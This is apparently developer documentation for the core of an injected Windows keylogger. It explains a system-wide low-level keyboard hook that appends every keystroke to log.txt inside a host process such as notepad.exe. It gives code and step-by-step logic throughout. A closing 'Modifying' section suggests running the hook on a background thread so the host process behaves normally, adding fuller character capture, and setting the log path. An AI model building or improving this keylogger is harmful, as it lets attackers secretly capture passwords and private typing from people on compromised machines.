# Keylogger.cpp

## Overview
`Keylogger.cpp` implements the two functions that form the keylogging core: a low-level keyboard hook callback that logs every key press to a file, and an initialisation function that installs the hook and drives the Windows message loop.

---

## Functions

### `Keylogger::HookProc`
```cpp
LRESULT Keylogger::HookProc(int code, WPARAM wParam, LPARAM lParam)
```

The hook procedure called by Windows for every low-level keyboard event system-wide.

| Parameter | Description |
| :--- | :--- |
| `code` | Hook code. Must be `HC_ACTION` for the event to be processed; any other value must be passed through immediately. |
| `wParam` | Message identifier — `WM_KEYDOWN`, `WM_KEYUP`, `WM_SYSKEYDOWN`, or `WM_SYSKEYUP`. |
| `lParam` | Pointer to a `KBDLLHOOKSTRUCT` containing the virtual-key code and additional key data. |

**Logic:**
1. Checks `code == HC_ACTION && wParam == WM_KEYDOWN` — only key-down events on valid hook codes are logged.
2. Casts `lParam` to `KBDLLHOOKSTRUCT*` and reads `vkCode` (Windows Virtual-Key code, e.g. `0x41` = `A`).
3. Opens `log.txt` in append mode (`std::ios::app`) via `std::ofstream`.
4. If the file opened successfully, writes one line per keystroke:
   ```
   Key was pressed: <vkCode> (char: <char cast of vkCode>)
   ```
5. Closes the file handle immediately after writing.
6. **Always** calls `CallNextHookEx(NULL, code, wParam, lParam)` and returns its result — mandatory for every hook proc so the event continues through the hook chain.

> **Log file location.** `log.txt` is opened with a relative path, so it is written to whatever the **current working directory** of the host process is at the time of injection. In the Keylogger pipeline this is typically the directory of `notepad.exe` or the injected process. To control the path explicitly, replace `"log.txt"` with a fully qualified path (see Modifying below).

> **Virtual-key to char cast.** `(char)vkCode` is a direct cast of the Windows Virtual-Key code to `char`. This works correctly only for printable ASCII keys (letters, digits, some symbols). Non-printable keys (Shift, Ctrl, F-keys, arrow keys, etc.) produce a raw numeric vkCode in the log with an unprintable or misleading char value. Use `MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR)` for a more accurate character translation.

> **File opened and closed per keystroke.** The current implementation reopens `log.txt` on every key event. This is safe for correctness (append mode ensures no data loss) but adds overhead on busy keyboards. For higher-throughput logging, keep the `ofstream` open as a module-level object and flush periodically instead.

---

### `Keylogger::Init`
```cpp
int Keylogger::Init()
```

Installs the global low-level keyboard hook and runs the message loop that keeps it alive. **Blocks the calling thread indefinitely** until the message loop terminates.

**Logic:**
1. Calls `SetWindowsHookExA(WH_KEYBOARD_LL, Keylogger::HookProc, NULL, 0)` to install a system-wide low-level keyboard hook.
   - `WH_KEYBOARD_LL` — intercepts keystrokes before they reach any window.
   - `NULL` module handle and thread ID `0` — applies globally to all threads on the desktop.
2. If `SetWindowsHookExA` returns `NULL`, prints `"Hook wasn't installed\n"` via `printf` and returns `-1`.
3. Runs a standard Windows message loop:
   ```cpp
   while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
       if (bRet == -1) return -1;
       TranslateMessage(&msg);
       DispatchMessage(&msg);
   }
   ```
   `WH_KEYBOARD_LL` requires an active message loop in the installing thread — without it, Windows cannot dispatch hook callbacks to `HookProc`.
4. Returns `0` when `GetMessage` receives `WM_QUIT`.

> **Blocking behaviour.** `Init` never returns while the hook is active. In `main.cpp` it is called directly from `entryPoint`, which means `entryPoint` also never returns. If you need the host process to continue normal execution, move `Init` to a dedicated thread (the commented-out `KeyloggerThread` / `CreateThread` pattern in `main.cpp` shows exactly how to do this).

> **Hook lifetime.** The `HHOOK` handle returned by `SetWindowsHookExA` is not stored. This means `UnhookWindowsHookEx` cannot be called to cleanly remove the hook. If clean teardown is needed, store the handle in a module-level variable and call `UnhookWindowsHookEx` from `DLL_PROCESS_DETACH` in `DllMain`.

---

## Modifying

**Control the log file path:**
Replace the hardcoded `"log.txt"` with a configurable path. A simple approach — module-level variable set before `Init` is called:
```cpp
// In Keylogger.cpp
static std::string g_logPath = "log.txt";

// In Keylogger.h — add:
void SetLogPath(const char* path);

// Implementation:
void Keylogger::SetLogPath(const char* path) { g_logPath = path; }
```
Then use `g_logPath` in `HookProc` instead of the literal.

**Improve character translation:**
Replace `(char)vkCode` with a proper translation to handle non-ASCII and shifted characters:
```cpp
BYTE kbState[256] = {};
GetKeyboardState(kbState);
WCHAR buf[4] = {};
ToUnicodeEx(vkCode, pKeyBoard->scanCode, kbState, buf, 4, 0, NULL);
// write buf to log
```

**Run the hook on a background thread:**
Uncomment the `KeyloggerThread` block in `main.cpp` and call `CreateThread` from `entryPoint` instead of calling `Keylogger::Init()` directly. This lets `entryPoint` return immediately while the hook stays active in the background.

**Store the hook handle for clean teardown:**
```cpp
// Module-level in Keylogger.cpp
static HHOOK g_hook = NULL;

// In Init():
g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, Keylogger::HookProc, NULL, 0);

// In DllMain DLL_PROCESS_DETACH (main.cpp):
if (g_hook) UnhookWindowsHookEx(g_hook);
```